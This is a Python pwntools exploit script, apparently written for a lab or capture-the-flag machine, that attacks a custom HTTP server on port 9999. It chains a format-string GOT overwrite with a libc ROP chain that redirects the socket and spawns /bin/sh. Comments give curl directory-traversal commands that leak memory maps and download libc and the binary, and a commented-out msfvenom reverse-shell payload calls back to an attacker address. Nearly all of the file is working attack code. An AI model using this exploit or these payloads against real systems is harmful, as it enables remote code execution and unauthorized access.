#!/usr/bin/env python3

from pwn import *
from pwnlib.constants import PROT_READ, PROT_WRITE, PROT_EXEC, MAP_PRIVATE, MAP_ANON
import urllib.parse
import time

# Leaked using directory traversal bug on web server
BINARY = "./httpserver"

BINARY_BASE = 0x565b3000    # Remote
#BINARY_BASE = 0x56555000    # Local

LIBC_BINARY = "libc-2.27.so"                # Remote
#LIBC_BINARY = "/usr/lib32/libc-2.29.so"     # Local

LIBC_BASE = 0xf7d4b000  # Remote
#LIBC_BASE = 0xf7dd8000  # Local

CONN_FD = 5     # Standalone
CONN_FD = 4     # Debugger

TARGET = "10.10.10.148"
#TARGET = "127.0.0.1"

# Leak remote addresses
# curl --path-as-is -H "Range: bytes=0-10000" http://10.10.10.148:9999/../../../../../proc/self/maps
# Get binaries
# curl --path-as-is http://10.10.10.148:9999/../../../../../lib32/libc-2.27.so --output libc-2.27.so
# curl --path-as-is http://10.10.10.148:9999/../../../../../proc/self/exe --output httpserver

#PUTS_GOT_OFFSET = 0x5048
PUTS_GOT_OFFSET = ELF(BINARY).got["puts"]

#WHERE = 0x45454545
#WHERE = 0xbadc0ded
#WHERE = 0xfffe32a8
#WHERE = 0xffffc60c
#WHERE = BINARY_BASE + PUTS_GOT_OFFSET

#WHAT  = 0xcafebabe

def escape(x):
    return urllib.parse.quote(x).encode().replace(b"%20", b" ")

# This is not required. We use a ROP only payload
def build_shellcode():
    return b"\xcc\xcc\xcc\xcc"

    # msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.148 LPORT=80 -f py -b '\x00\x25'
    #buf =  ""
    #buf += "\xdb\xdf\xd9\x74\x24\xf4\xbb\xdb\xa8\x11\xcf\x5d\x29"
    #buf += "\xc9\xb1\x12\x31\x5d\x17\x03\x5d\x17\x83\x36\x54\xf3"
    #buf += "\x3a\xf9\x7e\x03\x27\xaa\xc3\xbf\xc2\x4e\x4d\xde\xa3"
    #buf += "\x28\x80\xa1\x57\xed\xaa\x9d\x9a\x8d\x82\x98\xdd\xe5"
    #buf += "\x1e\x51\x10\x61\x76\x67\x2c\x89\xd7\xee\xcd\x39\xb1"
    #buf += "\xa0\x5c\x6a\x8d\x42\xd6\x6d\x3c\xc4\xba\x05\xd1\xea"
    #buf += "\x49\xbd\x45\xda\x82\x5f\xff\xad\x3e\xcd\xac\x24\x21"
    #buf += "\x41\x59\xfa\x22"

    return buf

def build_payload():
    what = where = 0
    where = BINARY_BASE + PUTS_GOT_OFFSET

    #payload = "AAAA %x|%x|%x|%x|%15$n HTTP/1.1"
    payload = b"AAAA "

    elf = ELF(LIBC_BINARY)
    elf.address = LIBC_BASE

    rop = ROP(elf)

    # 0xf7e0b10c <sigblock+108>:   add    esp,0x11c
    # 0xf7e0b112 <sigblock+114>:   ret
    what = rop.pivots[288]

    #ADDR_BASE = 0x80808080

    # ROP chain
    #rop.mmap(ADDR_BASE, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0xffffffff, 0)
    #rop.read(CONN_FD, ADDR_BASE, 0x500, 0)
    #rop.write(CONN_FD, ADDR_BASE, 0x500)
    #rop.call(ADDR_BASE)

    rop.dup2(CONN_FD, 0)
    rop.dup2(CONN_FD, 1)
    rop.dup2(CONN_FD, 2)
    rop.system(next(elf.search(b"/bin/sh\x00")))
    rop.exit(0)

    print(rop.dump())

    low  = what & 0xffff
    high = what >> 16

    if high > low:
        payload += p32(where)
        payload += p32(where+2)
    else:
        payload += p32(where+2)
        payload += p32(where)
        high, low = low, high

    #print("low: 0x%04x high: 0x%04x\n" % (low, high))

    low -= 10
    high -= low + 12

    payload += (f"|%{low}x|%53$hn|%{high}x|%54$hn").encode()
    payload += b"xxxAAAABBBB"   # BBB @ $esp+0x104
    payload += b"X"*19          # Stack pivot esp-288; ret
    #payload += b"ZZZZ"          # ROP chain starts here
    payload += rop.chain()
    payload = escape(payload) + b"\r\n\r\n"

    #print(payload)
    return payload

def exploit():
    context(arch = 'i386', os = 'linux')

    r = remote(TARGET, 9999)
    
    r.send(build_payload())
    #r.send(build_shellcode())
    r.interactive()

    #print(r.recv(10000))
    #print(r.recv(10000))

if __name__ == "__main__":
    exploit()
